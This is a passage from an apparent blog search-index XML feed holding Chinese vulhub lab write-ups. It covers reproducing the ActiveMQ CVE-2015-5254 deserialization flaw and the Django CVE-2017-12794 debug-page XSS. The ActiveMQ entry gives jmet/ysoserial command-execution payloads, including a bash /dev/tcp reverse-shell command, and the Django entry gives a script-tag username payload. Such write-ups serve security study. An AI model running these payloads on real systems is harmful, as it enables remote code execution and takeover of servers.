img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> activeMQ </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2015-5254 activeMQ 反序列化漏洞</title>
      <link href="/2019/01/01/activemq-fan-xu-lie-hua-lou-dong/"/>
      <url>/2019/01/01/activemq-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2015-5254-activeMQ-反序列化漏洞"><a href="#CVE-2015-5254-activeMQ-反序列化漏洞" class="headerlink" title="CVE-2015-5254 activeMQ 反序列化漏洞"></a>CVE-2015-5254 activeMQ 反序列化漏洞</h1><h2 id="activeMQ"><a href="#activeMQ" class="headerlink" title="activeMQ"></a>activeMQ</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><p>消息队列在大型电子商务类网站，如京东、淘宝、去哪儿等网站有这深入的应用，队列的主要作用是消除高并发访问高峰，加快网站的响应速度。在不使用消息队列的情况下，用户的请求数据直接写入数据库，在高并发的情况下，会对数据库造成巨大的压力，同时也使得系统响应延迟加剧。在使用队列后，用户的请求发给队列后立即返回（当然不能直接给用户提示订单提交成功，京东上提示：您“您提交了订单，请等待系统确认”），再由消息队列的消费者进程从消息队列中获取数据，异步写入数据库。由于消息队列的服务处理速度远快于数据库，因此用户的响应延迟可得到有效改善。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p><h3 id="漏洞利用过程如下："><a href="#漏洞利用过程如下：" class="headerlink" title="漏洞利用过程如下："></a>漏洞利用过程如下：</h3><ul><li>构造（可以使用ysoserial）可执行命令的序列化对象￼</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ul><p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><pre class=" language-bash"><code class="language-bash">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="token string">"touch /tmp/success"</span> -Yp ROME your-ip 61616</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164230.png-water_print" alt=""></p><p>此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过<a href="http://IP:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：" target="_blank" rel="noopener">http://IP:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：</a><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164305.png-water_print" alt=""></p><p>点击查看这条消息即可触发命令执行<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164325.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164339.png-water_print" alt=""></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><pre class=" language-bash"><code class="language-bash">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="token string">"bash -i >&amp; /dev/tcp/IP/1234 0>&amp;1"</span> -Yp ROME IP 61616</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> activeMQ </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django debug page XSS漏洞</title>
      <link href="/2018/05/07/django-debug-page-xss-lou-dong/"/>
      <url>/2018/05/07/django-debug-page-xss-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）分析"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）分析" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）分析"></a>Django debug page XSS漏洞（CVE-2017-12794）分析</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成__cause__，最后被显示在页面中。</p><p>所以我们假设有如下场景：</p><ol><li>用户注册页面，未检查用户名</li><li>注册一个用户名为&lt;script&gt;alert(1)&lt;/script&gt;的用户</li><li>再次注册一个用户名为&lt;script&gt;alert(1)&lt;/script&gt;的用户</li><li>触发duplicate key异常，导致XSS漏洞</li></ol><p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607170502.png-water_print" alt="结果1"></p><p>可见，Postgres抛出的异常为:</p><pre><code>duplicate key value violates unique constraint "xss_user_username_key"DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Django </tag>
            
            <tag> CVE-2017-12794 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
